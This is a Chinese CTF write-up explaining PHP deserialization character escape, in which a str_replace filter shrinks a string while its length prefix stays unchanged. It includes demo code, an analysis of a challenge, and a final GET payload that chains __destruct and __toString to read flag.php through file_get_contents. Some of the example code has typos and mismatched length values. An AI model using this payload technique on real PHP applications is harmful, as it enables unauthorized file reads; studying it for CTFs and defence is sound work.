---
title:  关于php反序列化字符逃逸的思考
categories: [CTF]
tags: [php,web]

---

php反序列化字符逃逸：指序列化的字符串是受某函数的所谓过滤处理后，字符串的某一部分会变化但描述其长度的数字没有改变.导致PHP在按该数字读取相应长度字符串后，本来属于该字符串的内容逃逸出了成为反序列化的一个属性,并成功反序列化.
<!-- more -->


### 0x01逃逸产生的原因

1.PHP在类进行序列化时，对类中不存在的属性也会进行反序列。

```php+HTML
<?php
class c{
    public $c='ccc';    
}

$a=new C;
echo serialize($a);//输出  O:1:"C":1:{s:1:"c";s:3:"ccc";}

print_r(unserialize('O:1:"C":1:{s:1:"c";O:1:"C":1:{s:1:"c";s:3:"ccc";}}'));
//输出  C Object ( [c] => C Object ( [c] => ccc ) )
print_r(unserialize('O:1:"C":2:{s:1:"c";s:3:"ccc";s:1:"b";O:1:"C":1:{s:1:"c";s:3:"ccc";}}'));
//输出C 
//Object ( [c] => ccc [b] => C Object ( [c] => ccc ) )
?>
```

2.PHP进行反序列化时，是以';' 作为字段的分隔，以 '}'作为结尾(字符串除外)，并且是根据长度判断内容的。

```php
class B{

   public $b='B';

}
class A{
    public $a='this is a long  date';
    public $b=';s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}}';
    
}
$a= new A;
echo serialize($a);	
//得到的结果是：
//O:1:"A":2:{s:1:"a";s:20:"this is a long date";s:1:"b";s:38:";s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}}";}
$b=unserialize($a)
print_r($b);
//输出的是A Object ( [a] => this is a long date [b] => ;s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}} )
```

可以看出`O:1:"A":2:{s:1:"a";s:20:"this is a long date";s:1:"b";s:38:";s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}}";}`反序列化出来的是一个A对象有值为‘this is a long date’的字符串属性a，和值为‘;s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}}’字符串属性b。但如果有什么特殊的原因让反例化的值产生了变化,如:

```php
//如果有什么特殊的原因让反例化的值产生了变化如"this is a long date"中的'is a long date‘去掉
$b='O:1:"A":2:{s:1:"a";s:20:"this ";s:1:"b";s:38:";s:1:"b";O:1:"B":1:{s:1:"b";s:1:"B";}}";}'
print_r($b);
//输出是A Object ( [a] => this ";s:1:"b";s:38: [b] => B Object ( [b] => B ) )
this ";s:1:"b";s:38:";s:1:
```

可以看出输出结果为一个名为A的对象有两个属性一个是值为‘’this ';s:1:"b";s:38:'的字符串属性a，另一个名为B的对象(里有名为b值为B的字符串属性)。可见在我们将`s:20:"this is a long date";s:1:"b";s:38:";`中的"this is a long date"改成“this ”后，在反序列化，仍以20的字符串长度来反序化，同时刚好20个字符后双引号和;号，于是将"this ";s:1:"b";s:38:";s:1:b"当成一个字符串。同时剩下的`O:1:"B":1:{s:1:"b";s:1:"B";}}`被当成一个对象来反序列化出来，而最后的 `";}`被忽视掉。这样就逃逸出来一个B Object。





### 0x02例题分析

```php+HTML
<?php
show_source("fget.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}
$a = new A($_GET['a'],$_GET['b']);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a))));
?>
```

审计代码发现首先发现有三个类A、B、C。仔细分析，发现class A 有用于实例化传值的`__construct`方法。再分析类发现class C里有提示可以通过`__toString()`里file_get_contents函数读取flag。在class B，中有一个`__destruct()`里有个echo可以用来触发。发现unserialize与serialize函数发现是反序列化与序列化操作，但只能对class A进行操作。

分析完代码后，我们发现我们要想的效果是

```php
$a = new A();
$b = new B();
$c = new C();
$c->c = "flag.php";
$b->b = $c;
$a->username = "1";
$a->password = $b;
echo serialize($a);
```

得到一个序列化的结果:

`O:1:"A":2:{s:8:"username";s:1:"1";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`

但一个正常的A的对象序列化的结果为：

`O:1:"A":2:{s:8:"username";s:1:"1";s:8:"password";s:1:"1";}`

但我们可以通过php反序列化字符逃逸将`s:8:"password";s:1:"1";`替换为`O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}`来达到我们想要的结果。

但再回到原码发现我们不是直接将序列化后的字符提交给unserialize函数。而是先将class A先实例出一个对象在将这个对象序列化，再经过write与read函数后，再提交给unserialize函数执行。我们分析write与read函数发现：

```php
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
    //str_replace() 函数用法（要替换的字符，替换成的字符，要处理的字符串）
}

function read($data) {
    return str_replace('\0\0\0'比, chr(0) . '*' . chr(0), $data);
    //'\0\0\0'比chr(0) . '*' . chr(0)多了3个字符长度
}
```

我们提交的数据中用‘\0\0\0’在执行read后就少了三字符。因此我们可以构造参数$a中有多个’\0\0\0’让他执行read后多出来的字符长度用来逃逸。让php编译器将`";s:8:"password";s:60:"2`是username的值。即`$a->username=“********";s:8:"password";s:60:"2";`

```php
O:1:"A":2:{s:8:"username";s:48:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"password";s:74:"2";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}";}
//得到--〉
O:1:"A":2:{s:8:"username";s:24:"********";s:8:"password";s:60:"2";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}";}//*号附近两边有看不见的chr(0)

```

所以构造payload：

`a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=2";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`

### 0x00参考文献

https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/

https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/

